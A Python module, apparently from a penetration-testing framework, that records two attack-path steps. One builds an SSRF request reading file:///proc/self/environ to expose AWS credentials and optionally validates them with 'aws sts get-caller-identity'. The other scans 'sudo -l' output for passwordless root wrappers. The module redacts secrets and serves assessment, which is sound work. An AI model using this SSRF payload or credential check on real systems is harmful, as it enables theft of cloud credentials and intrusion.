#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Ch9 入口扩展（AC-01..06）。

一手事实：`docs/research/foothold-traditional-ch9-canonical.md` T-1..T-3。
凭据只产指纹；五值结论 reason 沿用既有集合。
"""
import re
from typing import Any, Dict, List, Tuple

ABSENT, AUTH_REQUIRED, EXPOSED_NO_AUTH, EXPLOITED, BLOCKED = (
    "ABSENT", "AUTH_REQUIRED", "EXPOSED_NO_AUTH", "EXPLOITED", "BLOCKED")

AWS_KEYS = ("AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN")
_CRED_RE = re.compile(r'(AWS_(?:ACCESS_KEY_ID|SECRET_ACCESS_KEY|SESSION_TOKEN))\s*=\s*([^\s\x00"\']+)')


def _fingerprints(text: str) -> List[Tuple[str, int, str]]:
    out = []
    for m in _CRED_RE.finditer(text or ""):
        v = m.group(2)
        out.append((m.group(1), len(v), "ssrf-env"))
    return out


def _redact(text: str) -> str:
    return _CRED_RE.sub(lambda m: "%s=<redacted>" % m.group(1), text or "")


def ssrf_credential_entry(ctx: Any) -> Dict[str, Any]:
    """trad-09（AC-01..04）：从 SSRF 响应识别 AWS 凭据键名，只产指纹。"""
    response = getattr(ctx, "ssrf_response", "") or ""
    fps = _fingerprints(response)
    command = "curl -s \"<PORTAL>/api/export?template_url=file:///proc/self/environ\""
    output = _redact(response)[:800]
    if not fps:
        return dict(step_id="trad-09", outcome=ABSENT, reason="none_found",
                    summary="SSRF 响应无 AWS 凭据键名", command=command,
                    shot_cmd="screenshot --region trad09", output=output or "（空响应）", fingerprints=[])
    verify = bool(getattr(ctx, "verify_credential", False))
    if verify:
        result = ctx.command.run(("aws", "sts", "get-caller-identity"), timeout=ctx.timeout)
        output += "\n$ aws sts get-caller-identity\n(status=%d)\n%s" % (
            result.code, (result.stdout or result.stderr)[:400])
        if result.ok and "Arn" in (result.stdout or ""):
            return dict(step_id="trad-09", outcome=EXPLOITED, reason="",
                        summary="%d 条凭据指纹，身份已验证" % len(fps),
                        command=command + " ; aws sts get-caller-identity",
                        shot_cmd="screenshot --region trad09", output=output, fingerprints=[f[0] for f in fps])
    return dict(step_id="trad-09", outcome=EXPOSED_NO_AUTH, reason="",
                summary="%d 条 AWS 凭据指纹（未验证）" % len(fps),
                command=command, shot_cmd="screenshot --region trad09", output=output, fingerprints=[f[0] for f in fps])


def gpu_foothold_entry(ctx: Any) -> Dict[str, Any]:
    """trad-10（AC-05/06）：sudo -l 输出识别 NOPASSWD 包装脚本。"""
    sudo_text = getattr(ctx, "sudo_l_output", "") or ""
    command = "sudo -l"
    found = re.findall(r"\(root\)\s*NOPASSWD:\s*([^\n,]+)", sudo_text)
    if not found:
        return dict(step_id="trad-10", outcome=ABSENT, reason="none_found",
                    summary="sudo -l 无 NOPASSWD 包装脚本", command=command,
                    shot_cmd="screenshot --region trad10", output=sudo_text[:600] or "（空）", wrappers=[])
    return dict(step_id="trad-10", outcome=EXPOSED_NO_AUTH, reason="",
                summary="%d 个 NOPASSWD 包装脚本" % len(found), command=command,
                shot_cmd="screenshot --region trad10", output=sudo_text[:800], wrappers=[s.strip() for s in found])
